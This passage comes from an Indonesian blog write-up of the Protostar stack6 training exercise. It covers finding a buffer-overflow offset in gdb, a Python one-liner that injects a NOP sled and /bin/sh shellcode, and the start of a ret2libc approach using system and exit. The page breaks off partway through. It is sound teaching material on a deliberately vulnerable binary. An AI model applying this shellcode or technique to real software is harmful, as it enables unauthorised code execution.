+    style="padding-bottom: 108.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAWCAYAAADAQbwGAAAACXBIWXMAAAsSAAALEgHS3X78AAAEIklEQVQ4y31Vy44bRRT157AHRQOIRwJDRARrxJIFCz6Bf0AKKEQBFog1CxAr2CBBJjBkxnb71eNp2+N2ux92t+3udrv9Go99OPfaSSQWtHVVVbfqnqo6595y4a17H+L143u4dfs93Hr7Xcj4teP32T/GK2++o3Nv3P0AL738Kr77/gcM4jE6gwHCWYaPPvmU/iOuu4Oj28c4unMXBc/n5GiMvufhqmtjOBzC6buI6AujkfrF5wcB5rMZLcd0miFNUq7ra0yt5aDrjeG4AQqzLMN8sUS+vkG2vMZ0uUG2uEbGwBkBsnxB/0YtpX+aL5ESMMlX+zH9q80W8q3X1yj0gwiXfooLN4YZ5LBHObLVFrN8jiSeYDZfYrraIVkQcLlV4Pl8jsVmh3hxo7bdKR4WyyUKU55wEseYjMeYTCYKkiYTxPRlnEvTZA+cTRGPR9pXfxJjSktlfZpiSTChohAEPvp9B+3OFSzrEpeWhW63y74F27bhksNOpwO710Oz2YTVstDrOYzp67ysc10PO/70hKPRCOGBdCE/HIYYRRHEP6SaYgHn/IM4A/bDMNR1EjcZT3RNGA558hkKEYMjTma84phtwnZEG9JfbdRhy+l5YmnN5gX6vo+AQNJGpMjjBgkpkG++WKAgnZ9sEx///iM+O/kFn5/+ikfGEzwoP8bX2p7gUe1vPDRO8ODg/6r0J32n+Ib2sPoXvuT4Pv3nvrMHfGJb+OLxb/j26R/4uXQK87KJ86qB09I5zioGqk0TT8ul5/1ivaZtuVHDP6Ui6uS+cmFiQCoUMCQ/7VodZqkMs1pDxSjDKBsoFUuoV6sol0o4PzvTfrVSUTO4QfH8jGsIWKvBYKyorYBRFKJumqpo33VVyVarhXa7rSY+4To7pJiKx3EwoECMFUFlfHNzswcUZFFOcm/MfIzYl01EaTHJxeVqqZWzXq/xf58CSvn5zMchVe71bM2rgaSSHyiw4zjo0TzPZf65etIZH4c8z9Wm06maJLcC+r4HwyDh5K8uhJOreqMBg1w1SXbxwJPQUKEwlUoVDaZUhfNF8iscS/yYaaSAw+FAJyX71Xga2+7xtD3dTFqpin3b1VaqSSpIfd2uVs9zDmPWowT4TNa9BXpN4WzBZP2v6ePAdrVaaStX3Ww22O12e8CMhW/xOq7bJ1BfwaQvu4uqIpaIM2aZyQMipZkkifoimvS3u90LUURl71mtSu3SRIDRSAJjBYnjRAMFXISQbEgphLw6M76d2+1WTQEFTDg0mYsiirw4IkKDwsgLI74W87FDa7Xa6F5dqV84lBjJVY+5ms8PtSxXsGQhyb3iYsfZk29ZLRWpTTqecexyHBxeIQGRNJI16+vrF1cWLmRHUUtOIcAO81H+M4TH/SaOns4jqGy4n7P1dM2LpuamfP8CheUx1S9/Pg0AAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="manual builtin_return_address"
+        title="manual builtin_return_address"
+        src="/static/33ac280a08b6a543e87e21abba0bcf47/bca35/protostar-stack6-3.png"
+        srcset="/static/33ac280a08b6a543e87e21abba0bcf47/772e8/protostar-stack6-3.png 200w,
+/static/33ac280a08b6a543e87e21abba0bcf47/e17e5/protostar-stack6-3.png 400w,
+/static/33ac280a08b6a543e87e21abba0bcf47/bca35/protostar-stack6-3.png 683w"
+        sizes="(max-width: 683px) 100vw, 683px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Dapat dibaca pada paragraf pertama yang saya tandai, berdasarkan <a href="https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html">https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html</a> fungsi ini mengembalikan return address dari fungsi yang sedang dijalankan. Dengan kata lain fungsi tersebut akan mengembalikan isi dari eip. Berdasarkan source codenya kembalian dari fungsi ini akan disimpan dalam variabel lokal ret. Kemudian akan dilakukan pengecekan, address pada variabel ret akan di <strong><em>and</em></strong> kan (and merupakan operasi bitwise) dengan <strong>0xbf000000</strong> jika menghasilkan <strong>0xbf000000</strong> kondisi akan terpenuhi dan kita gagal. Jika kalian ingin mengetahui lebih lanjut soal operasi bitwise silahkan dibaca <a href="https://en.wikipedia.org/wiki/Bitwise_operation#AND">disini</a>, disini akan saya sederhanakan saja. Kondisi akan terpenuhi jika eip memiliki return address 0xbfxxxxxx dimana x dapat berupa bilangan heksadesimal apa saja.</p>
+<p>Mari kita kerjakan terlebih dahulu stack6 ini dengan metode yang sama dengan stack5. Kita load ke gdb dan cari offsetnya.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">gdb -q stack6
+<span class="token builtin class-name">set</span> disassembly-flavor intel
+disas getpath
+b *0x080484af
+r //masukkan <span class="token number">100</span> karakter Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</code></pre></div>
+<p>Kita load stack6 ke gdb dalam mode quiet. Atur disassembly dalam mode intel. Melakukan disassembly pada fungsi getpath. Meletakkan breakpoint pada instruksi setelah pemanggilan fungsi gets. Setelah itu kita jalankan dan masukkan input 100 karakter yang kita dapatkan dari <a href="https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html">sini</a>.</p>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 683px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/65ec303ebb5e1f0372b603cd959f242b/bca35/protostar-stack6-4.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 92.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAIAAAAf7rriAAAACXBIWXMAAAsSAAALEgHS3X78AAACKElEQVQ4y3WU65KiMBCFeRZ/6jiiXAIkQBIIAVRm5v1fZr7A7tToulVdKZSc7nNpjew49fO1dQMP3UTNfOzGqbY9H5XpMqne0/ypTlm+O5wiaWxtOz34uutE0wrViLq5FGWcF3EmTmkei/K/YAXSezuOdBF1ABdNm8u6bE1ayn9hD+D548MM3t/v4JvOwQKqED6L4nBOuHdMMuo1+Pr1pV0AAwCZq6ZsNbL7eYZUnAskXIrqNdjf7nXXM9b4EcJMwyFko4JXTe+wg0or9Xv+HzADuWf9iOGA3y5pAK/zaRfAzldaQ+HV5HtoP9xuRAXg7ZxmCre01JYv6chbKq3kMXmlue0HvyxcRSS0kV21Bi14SeA0BUxyj5PFbv8eTctS933YjWmG/wYuGl1pO61gBOMfO/PgWZZntYnAYLLxXgfNetNMzmSOZlJUXUdT6mFyKmTnoyFYOhAM+KA5gINmGm2by+SzKJ9pp6KyQzR/frbO+fvirteNNjlV2lDjspAW8+mVq/ohqh8w3uAWBXgfXyBMZsr2eIkoDDdDyAyTnsEstrKWG2wlYJYpX38bde8QzHxaY95r2gTIVRQmhQSZlBKFFM+nvOAE9nvmT1SlcRF8GEjCPCDsIkrwDMc2ii50Z70P5xQvqWOynZnqx0gPw2qPxRXIQ3JbKcyX2oTYQiOVSpWtxZKvp4wLFXEp/IH8XQZ3nd3tRsdN+VptztkEF6lVY8vb3f70DTOYCVCD6SloAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="mencari offset dengan gdb"
+        title="mencari offset dengan gdb"
+        src="/static/65ec303ebb5e1f0372b603cd959f242b/bca35/protostar-stack6-4.png"
+        srcset="/static/65ec303ebb5e1f0372b603cd959f242b/772e8/protostar-stack6-4.png 200w,
+/static/65ec303ebb5e1f0372b603cd959f242b/e17e5/protostar-stack6-4.png 400w,
+/static/65ec303ebb5e1f0372b603cd959f242b/bca35/protostar-stack6-4.png 683w"
+        sizes="(max-width: 683px) 100vw, 683px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Selanjutnya kita tinggal melihat isi eip untuk mengetahui ukuran offset.</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">info frame
+x/s 0xbffff7ac</code></pre></div>
+<p>ouput:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 683px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/4217dd4306cbe9282b59fac843cd15bb/bca35/protostar-stack6-5.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 50.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsSAAALEgHS3X78AAABJElEQVQoz2VRCY6EMAzjP8vuMly9j9BSBub//xmXoNWOkKwoVDiOnSbth6FFuCCcn4yTPkofALxookHph1B39EK1o2xsSmEtad+pbC6t+TgqXi+XsoqkQlQx1hrQkw7cRxOpk6bhj1FbKAOjNqh4mbTF+IdUP+P8PUx3fA2iwXpgQieuBeIyRB2pIhDsAPACPvA7CYD7th8V5QY/zdb5vALzabuXcCUvhfPX/4KVPAmQbSoNDPtcaHv6lMFftif0Y9mwOUfIjtCwnV5qVjYg2yWfgR3IDNvyqt1cN+xmyXtyj3WQM79cZJ9WuOXAOWGMgBprnrL1iiC3/cfarFxPxReC+UEZVNwZlZVRAc7pDxcZnFA2jIAfTLGU3Hl5vID5kdON/AYBQIiVsKU6QAAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="masih mencari offset dengan gdb"
+        title="masih mencari offset dengan gdb"
+        src="/static/4217dd4306cbe9282b59fac843cd15bb/bca35/protostar-stack6-5.png"
+        srcset="/static/4217dd4306cbe9282b59fac843cd15bb/772e8/protostar-stack6-5.png 200w,
+/static/4217dd4306cbe9282b59fac843cd15bb/e17e5/protostar-stack6-5.png 400w,
+/static/4217dd4306cbe9282b59fac843cd15bb/bca35/protostar-stack6-5.png 683w"
+        sizes="(max-width: 683px) 100vw, 683px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 276px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/4928fb596d016706e2ad897ac7d368b1/f2d11/protostar-stack6-6.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 33%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsSAAALEgHS3X78AAAA2ElEQVQY052O3U7DMAyF8/4PNa4Gd6OtSNDoVtLWTfMfMgFqKG1IV4EQSGjiuziybJ9jo9vdrsiL8lDlWbZ/KDHG19sbQsixerzHd1ebDSakyDPjfIxxnue4sGpE1ui6bqxzWquecy4WoINUGK1TR0pBKX1+eU3bb+O4+t/PIKG0MVYqyaXiQhlrUwITKmmfVCr35Nc7QwjDMNCmqdvW+VMIAXWMAeNCytSlDQDrz+OuBYCeV7SW2kzT9GVOofvy4LxfzPEC5k/GH28DdN/Hv/kjFHl/iv/lAzyBjjdNKdhiAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="masih mencari offset dengan gdb"
+        title="masih mencari offset dengan gdb"
+        src="/static/4928fb596d016706e2ad897ac7d368b1/f2d11/protostar-stack6-6.png"
+        srcset="/static/4928fb596d016706e2ad897ac7d368b1/772e8/protostar-stack6-6.png 200w,
+/static/4928fb596d016706e2ad897ac7d368b1/f2d11/protostar-stack6-6.png 276w"
+        sizes="(max-width: 276px) 100vw, 276px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Didapatkan offset 80. Kita buat payloadnya dengan sesi ssh baru seperti pada <a href="/belajar-reversing-protostar-stack5">stack5</a> dengan perubahan pada besar offset dan lokasi return address.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">python -c <span class="token string">"print( 'A' * 80 + '<span class="token entity" title="\xd0">\xd0</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xbf">\xbf</span>' + '<span class="token entity" title="\x90">\x90</span>'* 60 + '<span class="token entity" title="\x31">\x31</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x0b">\x0b</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\xdc">\xdc</span><span class="token entity" title="\xcd">\xcd</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xf3">\xf3</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\x68">\x68</span>')"</span>  <span class="token operator">></span> /tmp/payload</code></pre></div>
+<p><strong>0xbffff7d0</strong> didapatkan dari menambahkan eip dengan 4byte. Sekarang kita jalankan lagi dalam gdb dengan payload yang telah kita buat.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">r <span class="token operator">&lt;</span> /tmp/payload</code></pre></div>
+<p>ouput:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 681px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/588a5fbf0d8a3d3f3a72bc205a4a92e2/8ce52/protostar-stack6-7.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 35%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsSAAALEgHS3X78AAAAwUlEQVQY033PCQrCMBAF0JzHvWv2ydKGGhX0/qfxpxURK0IoHZI3f4bFc9ZhoDGNl2uYsh3G3tjeUKfN62vp2PFD23+dXSuYILcc6bzyAV2U8yiLVKYSspH6C6PcVk3MN6Z9hDExArfKdNrykmyX5JpLbkmQR/mJN6c63R7Mp8mlhMAhZ5pnnl+XWfCDdni6Tp7xnUGia1tywMq0p14sYM3WeKIh6RARggsss2+6NfiNlce2oawdorCOk2uk+u/f+Am1aFy8TNt3AQAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="jalankan dengan injeksi shellcode"
+        title="jalankan dengan injeksi shellcode"
+        src="/static/588a5fbf0d8a3d3f3a72bc205a4a92e2/8ce52/protostar-stack6-7.png"
+        srcset="/static/588a5fbf0d8a3d3f3a72bc205a4a92e2/772e8/protostar-stack6-7.png 200w,
+/static/588a5fbf0d8a3d3f3a72bc205a4a92e2/e17e5/protostar-stack6-7.png 400w,
+/static/588a5fbf0d8a3d3f3a72bc205a4a92e2/8ce52/protostar-stack6-7.png 681w"
+        sizes="(max-width: 681px) 100vw, 681px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Jeng jeng jeng... return address yang kita gunakan 0x<strong>bf</strong>fff7d0 memenuhi kondisional dan jika kita periksa ulang alamat dari stack.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">r <span class="token operator">&lt;</span> /tmp/payload
+x/100x 0xbffff7ac</code></pre></div>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 675px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/cd3466552113a6fa3fb65debf458d9af/23296/protostar-stack6-8.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 87.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAAsSAAALEgHS3X78AAACSUlEQVQ4y02TiZKjMAxE8z2zO7MkhPsKGOODO8n+/6/MM2aPKlVK2Gqpu+VcemPzR1uJvrdjI4ey7aK8jIsqKsq4rMK0IEnrJqmaIE6/wvjr/i8uADptyk6AT6vmnjsM1T6iogqzwsevKPkf6cCVkElZF23XKt1pXbbiluaU8ntNMn4p+ghuP64hyWcY/bzdiRM8jFM76KaXECNHRZg5AEQ4vMYpLWD36GUQJVw95FCLnvwTsJpmIqlquuplWd+vtK4BzK/X+vsd5UWYl8v7xfk1SRnA4bTvNKX+IrQhOEWSMBbb7nmBNyTDNEObkHYkOMQRzoUxgQc/BgUTTAIMPWhjEnd0xAUvu9Wmt9aDpZOpvHkXOhFp/eCbUWZdaUSdXle7bYjEPDUvBFS5okDN80kbAFKzxoH14gAsloF2f477HqY508b9ybkDVzUJ4JM2PIdpYqWAoUAjT5tR5HRhMlRZBGCu9LzI0el3bqOZR8KqAZO3WlPNHYL/au4O/RTAgpyyE8xHZ2x6uE2Ok542zgu3c/e2hLWd0sGhmcMTHB57hh7Pm2/0w5YKwGZZ8QYk08y2IfWWZHFZT8/nqZnJ6OEjOzSTUxQfmgFMh2HgyWnk3Z6eL+adq0IMO3SP5B7DmeGMAsyrUNMUHo8ER+kLgD8cSJifYPduB8XzBNBIxUV07Bn9uHpqNvaPYeQGyAl2bitTdYLhwox23fiHQc9JWDeMxA7ypncAGlFf9/IEw3N9v1kVS696SVd4+qdKURAnnpGf5sH84Tz4G03hCJTOSp70AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="isi stack"
+        title="isi stack"
+        src="/static/cd3466552113a6fa3fb65debf458d9af/23296/protostar-stack6-8.png"
+        srcset="/static/cd3466552113a6fa3fb65debf458d9af/772e8/protostar-stack6-8.png 200w,
+/static/cd3466552113a6fa3fb65debf458d9af/e17e5/protostar-stack6-8.png 400w,
+/static/cd3466552113a6fa3fb65debf458d9af/23296/protostar-stack6-8.png 675w"
+        sizes="(max-width: 675px) 100vw, 675px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Dapat dipastikan bahwa kita tidak bisa menggunakan alamat stack sebagai return address. Berdasarkan <a href="http://exploit.education/protostar/stack-six/">halaman resmi dari stack6</a> kita dapat menyelesaikan stack6 ini dengan 3 pendekatan:</p>
+<ul>
+<li>finding the duplicate of the payload</li>
+<li>ret2libc</li>
+<li>return orientated programming</li>
+</ul>
+<p>Dari ketiga pendekatan diatas kita akan menggunakan ret2libc. <strong>ret2libc</strong> atau <strong>return-to-libc</strong> adalah serangan keamanan komputer yang biasanya dimulai dengan buffer overflow di mana alamat pengembalian subrutin pada call stack (eip) diganti dengan alamat subrutin yang sudah ada dalam memori proses, melewati fitur keamanan bit no-eksekusi (jika ada ) dan menghilangkan kebutuhan penyerang untuk memasukkan kode(shellcode) mereka sendiri -<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">wikipedia</a>. Dengan kata lain kita tidak perlu memasukkan shellcode pada stack, kita cukup melakukan pemanggilan fungsi yang sudah ada dalam proses yang dapat memberikan kita akses ke shell. Libc sendiri merupakan library yang sangat umum digunakan pada sistem operasi linux. Didalam libc terdapat beberapa fungsi yang dapat memberikan akses shell, salah satunya ialah fungsi system.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token function">man</span> system</code></pre></div>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 683px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/91e3eed18d500a11531d130cb50f67fa/bca35/protostar-stack6-9.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 42%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsSAAALEgHS3X78AAABF0lEQVQY03WQ2W6DMBRE+Z2qkAAGvOPdBJJu6kP7/1/SASupVKnSPJjxnbnHVDpEbmxDpoaMUN2PLeWjVJOahXWj1MK4nglcnYZ9pmNCuEC45C5Vyge4GMLEIBTcQUic4cBHV90PJVlUFjx3RIZc8dkK64lQ7cRKDEIFlrcTfWT+CI1H2DiQKx+pnsEPVHSjuO7Jf8nf8NO5O49UOW9znmPSMbLZ4C0QWB6opzv5/dccYZuXsG4u555xwnfm80SBDQEbvQjs5nHAFdRR3pAjjBOwP7+/sErH5JeLdD6uV5sySsNlBVHaruvrW1w3TC63l+39QxgjfKoAgCUmZbcsTJvybHwCnmpTHBDpkExMk9Jubw/AlD7/AJn/a/qbxo26AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="output man system"
+        title="output man system"
+        src="/static/91e3eed18d500a11531d130cb50f67fa/bca35/protostar-stack6-9.png"
+        srcset="/static/91e3eed18d500a11531d130cb50f67fa/772e8/protostar-stack6-9.png 200w,
+/static/91e3eed18d500a11531d130cb50f67fa/e17e5/protostar-stack6-9.png 400w,
+/static/91e3eed18d500a11531d130cb50f67fa/bca35/protostar-stack6-9.png 683w"
+        sizes="(max-width: 683px) 100vw, 683px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Sebelum memulai membuat payload terlebih dahulu kita harus mengetahui bagaimana fungsi dipanggil dan argumen diberikan pada fungsi dengan membacanya pada halaman wikipedia <a href="https://en.wikipedia.org/wiki/X86_calling_conventions">berikut ini</a> atau pada blog pak Yohanes <a href="https://yohan.es/security/buffer-overflow/basic-stack-overflow/">disini</a>.</p>
+<p>Secara sederhana saat fungsi dipanggil, argumen/parameter yang diperlukan oleh fungsi tersebut akan dipush ke stack. Disusul oleh address instruksi setelah pemanggilan fungsi, address ini akan disimpan dalam eip agar saat fungsi selesai dieksekusi dapat melanjutkan kembali ke instruksi selanjutnya. Pada teknik ret2libc ini kita akan memanfaatkan fungsi system, fungsi ini membutuhkan argumen yang dalam kasus kita argumen tersebut adalah <em>/bin/sh</em>. Berbekal sedikit pengetahuan mengenai calling convention pada x86 kita akan membuat payload yang jika diilustrasikan kurang lebih seperti berikut.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 259px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/207a59bc75fdcd92a1ab4bb26261dcc5/a2ead/protostar-stack6-10.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 81%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsSAAALEgHS3X78AAABfklEQVQoz6WTWW+CQBSF/f+/piaNrQ+tFrGCS4txaxrZZAYXEIYBRFxoTzU1tU3VxPNwkxnux7lzBnIfVyj334MsyxY7pWm6Wq2hZZLEcZwkySkYGCr6KKVhGL60WqXHh2KxOFR1LDVN2263Z+AoiizL4py3FaUqVsrlJ1XTOQ9UVT0Pw3k+n2PV7/Wk5ypgak+wTwjZbDYXOQdBwBjzPM/3fcZQ/N/OiCTkHNnglQjmANu2jQp/YlmEUtA4ha7rR87IoHCbr0n1MIoM01yvN3sYgWF4Sard3xVu8vn3oYolnI9g13G6HWXqeukygc/BeTweYyJ093pdyBxZ2DQM4wi2KVVeWyxa8CDAeDv2C57NnJAHolgRBKFcKrU7fVy1aZoXBUYIrGLmexWxIjcai0WMwHDGIzj7Bvbkz7TDkHc6bUGs1uW6qmqMXXzPjuuu0mVdlmuS3Gy2BoM3fKfWaHRq7L3QgasihE52QniomGU6nZ7/Ma76qw7n/6tDwyfxSpGV6Aq2wgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="ilustrasi payload"
+        title="ilustrasi payload"
+        src="/static/207a59bc75fdcd92a1ab4bb26261dcc5/a2ead/protostar-stack6-10.png"
+        srcset="/static/207a59bc75fdcd92a1ab4bb26261dcc5/772e8/protostar-stack6-10.png 200w,
+/static/207a59bc75fdcd92a1ab4bb26261dcc5/a2ead/protostar-stack6-10.png 259w"
+        sizes="(max-width: 259px) 100vw, 259px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Kita akan memenuhi buffer dan ebp dengan karakter 'A'. Pada eip kita akan memasukkan address dari fungsi system diikuti dengan address fungsi exit (sebagai return address/eip dari fungsi system). Bagian terakhir ialah '/bin/sh' sebagai argumen yang dibutuhkan oleh fungsi system.</p>
+<p>Address fungsi system dan exit dapat dicari dengan perintah <code class="language-text">print</code> pada gdb. Pastikan sebelumnya kalian telah menjalankan stack6 pada gdb.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">r //jalankan stack6 paling tidak sekali
+print system
+print <span class="token builtin class-name">exit</span></code></pre></div>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 683px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/0aca245954e642de0e66df129bbd5b29/bca35/protostar-stack6-11.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 13%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsSAAALEgHS3X78AAAAdElEQVQI102OCw7CQAhEeyJt7AK7/La21vsfyalrGhMyIcBjZlqPd74O8XxULWpooCiyYE/2mKWRelGXyDvJrfComWSKbSfzmh0XaLQ/ocUcJIbQpSpHSnR8vMgfDNulWT13gKP1dfiwhZxwfBM5Ev3bDvgDYcEnwe25EfkAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="alamat fungsi system dan exit"
+        title="alamat fungsi system dan exit"
+        src="/static/0aca245954e642de0e66df129bbd5b29/bca35/protostar-stack6-11.png"
+        srcset="/static/0aca245954e642de0e66df129bbd5b29/772e8/protostar-stack6-11.png 200w,
+/static/0aca245954e642de0e66df129bbd5b29/e17e5/protostar-stack6-11.png 400w,
+/static/0aca245954e642de0e66df129bbd5b29/bca35/protostar-stack6-11.png 683w"
+        sizes="(max-width: 683px) 100vw, 683px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Sebagai argumen/parameter untuk fungsi system, string '/bin/sh', dapat kita cari dalam libc atau memasukkan secara manual melalui environment variable. Kita akan menggunakan yang sudah tersedia dalam libc. Untuk mencarinya sebenarnya bisa dengan perintah find pada gdb namun sayang sekali saya tidak berhasil sehingga saya menggunakan utilitas <code class="language-text">strings</code> yang tersedia pada protostar. Terlebih dahulu cari libc yang digunakan oleh stack6.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">info proc map</code></pre></div>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 680px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/16c5c1f5157a799d4733d5c160ae8556/c5bb3/protostar-stack6-12.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
